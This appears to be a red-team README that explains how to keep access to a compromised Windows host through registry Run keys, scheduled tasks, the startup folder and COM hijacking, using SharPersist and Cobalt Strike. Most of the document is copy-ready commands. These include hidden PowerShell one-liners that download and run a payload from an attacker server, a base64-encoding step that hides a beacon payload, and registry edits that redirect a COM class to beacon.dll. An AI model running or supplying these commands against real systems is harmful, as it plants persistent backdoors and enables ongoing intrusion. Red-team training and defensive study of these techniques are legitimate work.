# Methods of regaining or maintaining access to a compromised host

Following methods can be used to regain access to a compromised host.

#### <b>1.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/blob/main/Host_persistance/README.md#1-registry-autoruns-1">Registry Autoruns</a>
#### <b>2.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/blob/main/Host_persistance/README.md#2-scheduled-tasks-1">Scheduled Tasks</a>
#### <b>3.</b> <a href="https://github.com/incredibleindishell/Red_Team_Op/blob/main/Host_persistance/README.md#3-startup-folder-1">Startup Folder</a>

To create the payloads for above mentioned scenarios, user can use SharPersist tool from below mentioned Github Repo:

https://github.com/mandiant/SharPersist

SharPersist allows a user to create payload for different backdooring techniques. 

It supports following options/arguments 

    -t: Persistence technique
    -c: Command to execute
    -a: Arguments of command to execute (if applicable)
    -f: File to create/modify
    -k: Registry key to create/modify
    -v: Registry value to create/modify
    -n: Scheduled task name OR Service name
    -m: Method(add, remove, check, list)
    -o: Optional add-ons
    -h: Help page


#### 1. Registry Autoruns
---
To add the registry entry, either use Shapersist or do it manually. 

<b>Using SharPersist:</b>
    
a) Current user: 

Below mentioned command will add a new registry entry under "current user" registry `(HKEY_CURRENT_USER)`. When user will login to the machine, this regsitry key will execute the command which will make an HTTP request to the Cobalt Strike server to download the PowerShell payload and will execute it.

    SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))" -k "hkcurun" -v "b0x" -m add

b) Local Machine <b>(Admin privilege required)</b>: 

Below mentioned command will add a new registry entry under "Local Machine" registry `(HKEY_LOCAL_MACHINE)`. When user will login to the machine, this regsitry key will execute the command which will make an HTTP request to the Cobalt Strike server to download the PowerShell payload and will execute it.

    SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))" -k "hklmrun" -v "b0x" -m add

<b>Manually:</b>
    
a) Current user: 

Below mentioned command will add a new registry entry under "current user" registry `(HKEY_CURRENT_USER)`. When user will login to the machine, this regsitry key will execute the command which will make an HTTP request to the Cobalt Strike server to download the PowerShell payload and will execute it.

    REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  /t REG_SZ  /v box2 /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))"

b) Local Machine <b>(Admin privilege required)</b>: 

Below mentioned command will add a new registry entry under "Local Machine" registry `(HKEY_LOCAL_MACHINE)`. When user will login to the machine, this regsitry key will execute the command which will make an HTTP request to the Cobalt Strike server to download the PowerShell payload and will execute it.

    REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run  /t REG_SZ  /v box2 /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))" 


    
#### 2. Scheduled Tasks
---

In local machine, open PowerShell console and execute below mentioned commands to generate the base64 encoded text of the Cobalt strike's PowerShell based beacon payload:

    PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://cobalt_strike_server/poershell_payload"))'
    PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

In Cobalt strike beacon console, execute below mentioned command (replace text Base_64_encoded_payload_goes_here with the output generated in the above step) to add a new scheduled task with name `b0x` which will execute after every one hour:
    
    execute-assembly C:\Path_to_sharpersist\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc Base_64_encoded_payload_goes_here" -n "b0x" -m add -o hourly

<b>Example:</b>
In below mentioned example, adding a task which will make an HTTP request to Teamserver on URL `http://192.168.56.104/ps.ps1` and will execute the PowerShell payload whenever user will logon to the machine:

     SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))" -n "Updater" -m add -o logon


#### 3. Startup Folder
---

    SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))"  -f "b0x" -m add
    
        
#### 4. Com Hijack

    function pwn {
     $Tasks = Get-ScheduledTask

    foreach ($Task in $Tasks)
    {
    if ($Task.Actions.ClassId -ne $null)
    {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
     }
    }
    }
    }
    
 Import the PowerShell code using below mentioned command:
 
    powershell-import /path_to/enu.ps1
   
 Now, execute the code using Powerpick or PowerShell
 
    powerpick pwn

or

    powershell pwn

Below mentioned command will show the information regarding CLSID from the HKCR registry entry

    powershell Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | fl
    
 Now execute below mentioned commands to verify whether entry for CLSID exists in HKCU or not:
 
    powerpick Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
    
 Output is showing, the entry for CLSID exists in HKLM only.
 
    powerpick New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
    powerpick New-Item -PATH "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -Name "InprocServer32" -Value "c:\Users\Administrator\Desktop\beacon.dll"
    powerpick New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 
